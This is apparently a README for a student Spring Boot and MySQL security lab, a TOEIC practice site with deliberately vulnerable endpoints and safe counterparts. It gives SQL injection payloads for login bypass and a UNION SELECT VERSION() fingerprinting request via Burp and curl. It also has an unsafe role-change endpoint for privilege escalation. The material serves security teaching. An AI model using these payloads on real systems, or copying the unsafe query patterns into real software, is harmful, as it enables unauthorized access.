# TOEIC Defense Backend

Website Spring Boot ket noi MySQL phuc vu de tai:

> Kien truc, cac thanh phan, tinh nang va cac co che bao mat cua MySQL. Xay dung website don gian ket noi database trong MySQL; thuc nghiem mot so demo tan cong va trien khai cac co che bao mat cua MySQL de khac phuc. Demo danh gia hieu qua truoc va sau khi ap dung giai phap.

## Muc tieu project

- Xay dung backend Spring Boot cho website luyen thi TOEIC.
- Ket noi MySQL va thao tac voi cac bang `users`, `profiles`, `exams`, `questions`, `exam_answers`, `exam_results`.
- DEMO 1: SQL Injection trong login unsafe va authentication bypass.
- DEMO 1 mo rong: endpoint doi role unsafe de minh hoa leo thang dac quyen.
- DEMO 2: SQL Injection trong tim kiem de thi va MySQL database fingerprinting bang `UNION SELECT VERSION()`.
- DEMO after: endpoint an toan dung parameter binding de ngan SQL Injection.

## Canh bao lab

Project nay co cac endpoint vulnerable duoc tao co chu dich de phuc vu security lab:

- `POST /api/auth/loginUnsafe`
- `GET /api/exams/searchUnsafe?keyword=...`
- `PUT /users/{id}/roleUnsafe`

Khong dung cac endpoint nay trong production. Chi test tren moi truong local, Docker lab, hoac he thong duoc phep kiem thu.

## Cong nghe su dung

- Java 21+
- Spring Boot 4.1.1
- Spring Web MVC
- Spring Data JPA
- Spring Security OAuth2 Resource Server
- JWT
- MySQL
- Maven Wrapper
- Lombok
- MapStruct

## Yeu cau truoc khi chay

Thanh vien nhom can cai:

- JDK 21 hoac moi hon
- MySQL Server 8.x
- Git
- IDE: IntelliJ IDEA hoac VS Code
- Burp Suite Community neu muon test red team
- Docker neu muon dung lab CVE rieng

Kiem tra Java:

```powershell
java -version
```

Kiem tra MySQL dang chay:

```powershell
mysql --version
```

## Clone project

```powershell
git clone <GITHUB_REPO_URL>
cd toeic-defense-backend
```

Neu repo GitHub chua co, xem phan "Huong dan day project len GitHub" ben duoi.

## Cau hinh database

Tao database:

```sql
CREATE DATABASE IF NOT EXISTS toeic_db;
USE toeic_db;
```

Mo file:

```text
src/main/resources/application.properties
```

Sua thong tin ket noi MySQL theo may cua tung thanh vien:

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/toeic_db?useSSL=false&serverTimezone=UTC&allowPublicKeyRetrieval=true
spring.datasource.username=root
spring.datasource.password=YOUR_MYSQL_PASSWORD
```

Khuyen nghi moi thanh vien dung password MySQL rieng tren may minh. Khong nen commit password that len GitHub trong project production.

Project dang de:

```properties
spring.jpa.hibernate.ddl-auto=update
```

Khi chay app, Hibernate se tu tao/cap nhat schema theo entity.

## Import data mau

Sau khi database `toeic_db` da ton tai, co the import file:

```text
src/main/resources/demo-mysql-security.sql
```

Bang MySQL command line:

```powershell
mysql -u root -p toeic_db < src/main/resources/demo-mysql-security.sql
```

Hoac mo file SQL trong MySQL Workbench roi chay.

File nay tao du lieu mau cho:

- De thi
- Cau hoi
- Dap an
- Mot so user MySQL minh hoa least privilege

## Chay project

Tu thu muc goc Spring Boot:

```powershell
cd toeic-defense-backend
.\mvnw.cmd spring-boot:run
```

Mac dinh app chay tai:

```text
http://localhost:8080
```

Neu cong 8080 dang bi chiem:

```powershell
.\mvnw.cmd spring-boot:run "-Dspring-boot.run.arguments=--server.port=8081"
```

Mo:

```text
http://localhost:8081
```

## Chay test

```powershell
.\mvnw.cmd test
```

Neu test pass se thay:

```text
BUILD SUCCESS
```

## Tai khoan va dang nhap

Co the dang ky truc tiep tren giao dien web.

Hoac goi API:

```http
POST /api/auth/register
Content-Type: application/json

{
  "username": "student1",
  "password": "123456"
}
```

Dang nhap:

```http
POST /api/auth/loginUnsafe
Content-Type: application/json

{
  "username": "student1",
  "password": "123456"
}
```

Response tra ve JWT token:

```json
{
  "token": "..."
}
```

## Cac endpoint chinh

Auth:

```text
POST /api/auth/register
POST /api/auth/loginUnsafe
POST /api/auth/loginSecure
GET  /api/auth/me
POST /api/auth/refresh
```

Exam:

```text
GET    /exams
GET    /exams/{examId}
POST   /exams
PUT    /exams/{examId}
DELETE /exams/{examId}
```

Question:

```text
GET /questions/exam/{examId}
```

Submit exam:

```text
POST /exam-results/submit
GET  /exam-results/me
```

DEMO 2:

```text
GET /api/exams/searchUnsafe?keyword=<input>
GET /api/exams/search?keyword=<input>
```

## DEMO 1: SQL Injection login unsafe

Endpoint:

```text
POST /api/auth/loginUnsafe
```

Muc tieu:

```text
SQL Injection -> Authentication Bypass
```

Payload vi du:

```json
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

Ket qua mong doi truoc khi khac phuc:

- Co the dang nhap khong can password dung.
- Server tra ve JWT token neu payload phu hop voi query unsafe.

## DEMO 1 mo rong: Leo thang dac quyen

Endpoint unsafe:

```text
PUT /users/{id}/roleUnsafe
```

Payload:

```json
{
  "role": "ADMIN"
}
```

Muc tieu:

```text
User thuong -> doi role -> ADMIN -> truy cap API quan tri
```

Day la endpoint lab de minh hoa loi authorization. Khong dung trong production.

## DEMO 2: SQL Injection va MySQL fingerprinting

Endpoint vulnerable:

```text
GET /api/exams/searchUnsafe?keyword=<input>
```

Query vulnerable trong code:

```sql
SELECT title FROM exams WHERE title LIKE '%<keyword>%'
```

Endpoint an toan:

```text
GET /api/exams/search?keyword=<input>
```

Query safe:

```sql
SELECT title FROM exams WHERE title LIKE ?
```

Endpoint safe dung parameter binding nen payload SQL Injection khong duoc thuc thi.

### Test tim kiem binh thuong

```http
GET /api/exams/searchUnsafe?keyword=TOEIC
Authorization: Bearer <TOKEN>
```

### Test fingerprinting bang Burp Suite

1. Mo Burp Suite.
2. Bat proxy browser qua Burp.
3. Dang nhap vao website.
4. Tren web, tim kiem de thi binh thuong.
5. Trong Burp, bat request:

```http
GET /api/exams/searchUnsafe?keyword=TOEIC HTTP/1.1
Host: localhost:8080
Authorization: Bearer <TOKEN>
```

6. Send request sang Repeater.
7. Doi `keyword` thanh payload da URL encode:

```text
%27%20UNION%20SELECT%20VERSION()%20--%20
```

Request:

```http
GET /api/exams/searchUnsafe?keyword=%27%20UNION%20SELECT%20VERSION()%20--%20 HTTP/1.1
Host: localhost:8080
Authorization: Bearer <TOKEN>
```

Ket qua mong doi:

```json
[
  {
    "title": "8.0.44"
  }
]
```

Version thuc te phu thuoc MySQL dang ket noi.

### Test bang curl

```bash
curl -H "Authorization: Bearer TOKEN_CUA_BAN" \
"http://localhost:8080/api/exams/searchUnsafe?keyword=%27%20UNION%20SELECT%20VERSION()%20--%20"
```

Test endpoint safe:

```bash
curl -H "Authorization: Bearer TOKEN_CUA_BAN" \
"http://localhost:8080/api/exams/search?keyword=%27%20UNION%20SELECT%20VERSION()%20--%20"
```

Ket qua:

- `searchUnsafe`: co the tra ve MySQL version.
- `search`: khong thuc thi `UNION SELECT`, payload chi la chuoi tim kiem.

## Ket noi voi CVE-2012-2122 lab

Project Spring Boot nay chi phuc vu:

```text
SQL Injection -> Database Fingerprinting -> MySQL Version -> Vulnerability Assessment
```

Khong trien khai CVE-2012-2122 trong Spring Boot.

CVE-2012-2122 nen duoc dung trong Docker lab rieng:

```text
Fingerprint thay MySQL 5.5.x truoc 5.5.24
-> danh gia co nguy co CVE-2012-2122
-> chuyen sang Docker MySQL vulnerable lab
-> validate CVE trong moi truong co kiem soat
```

Neu DB hien tai la MySQL 8.0.44 thi response `VERSION()` se la `8.0.44`. Neu backend ket noi toi MySQL lab 5.5.23 that thi response se la `5.5.23`.

## Cau truc project

```text
src/main/java/com/toeic_defense_backend
|-- config
|   |-- SecurityConfig.java
|-- controller
|   |-- AuthController.java
|   |-- ExamController.java
|   |-- ExamSearchController.java
|   |-- QuestionController.java
|   |-- ExamResultController.java
|-- dto
|   |-- request
|   |-- response
|-- entity
|   |-- User.java
|   |-- Exam.java
|   |-- Question.java
|   |-- ExamAnswer.java
|   |-- ExamResult.java
|-- repository
|   |-- unsafe
|       |-- UnsafeAuthRepository.java
|       |-- UnsafeExamSearchRepository.java
|-- service
|-- service/impl
```

Static frontend:

```text
src/main/resources/static
|-- index.html
|-- app.js
|-- style.css
```

## Huong dan day project len GitHub

Chay cac lenh sau tai thu muc chua project Spring Boot, noi co file `pom.xml`:

```powershell
cd F:\toeic-defense-backend\toeic-defense-backend
git init
git add .
git commit -m "Initial TOEIC defense security lab"
```

Tao repository moi tren GitHub:

1. Vao `https://github.com/new`.
2. Dat ten repo, vi du `toeic-defense-backend`.
3. Chon Public hoac Private.
4. Khong can tao README tren GitHub vi project da co README.
5. Bam Create repository.

Sau do link local repo voi GitHub:

```powershell
git branch -M main
git remote add origin https://github.com/<USERNAME>/toeic-defense-backend.git
git push -u origin main
```

Neu GitHub yeu cau dang nhap, dung GitHub account hoac Personal Access Token.

## Moi thanh vien nhom clone ve lam

Sau khi repo da duoc push:

```powershell
git clone https://github.com/<USERNAME>/toeic-defense-backend.git
cd toeic-defense-backend
```

Moi thanh vien can sua:

```text
src/main/resources/application.properties
```

Doi password MySQL theo may cua minh:

```properties
spring.datasource.password=YOUR_MYSQL_PASSWORD
```

Sau do chay:

```powershell
.\mvnw.cmd spring-boot:run
```

## Workflow lam viec nhom

Moi thanh vien nen tao branch rieng:

```powershell
git checkout -b ten-thanh-vien/chuc-nang
```

Sau khi sua code:

```powershell
git status
git add .
git commit -m "Mo ta ngan gon thay doi"
git push -u origin ten-thanh-vien/chuc-nang
```

Len GitHub tao Pull Request vao branch `main`.

Truoc khi push nen chay:

```powershell
.\mvnw.cmd test
```

## Luu y bao mat khi nop bai

- Khong dung endpoint unsafe trong production.
- Khong test Burp/Kali tren he thong khong duoc phep.
- Neu public GitHub repo, can than voi password database trong `application.properties`.
- Nen tao file cau hinh rieng theo may neu can lam nghiem tuc hon, vi du dung environment variables.

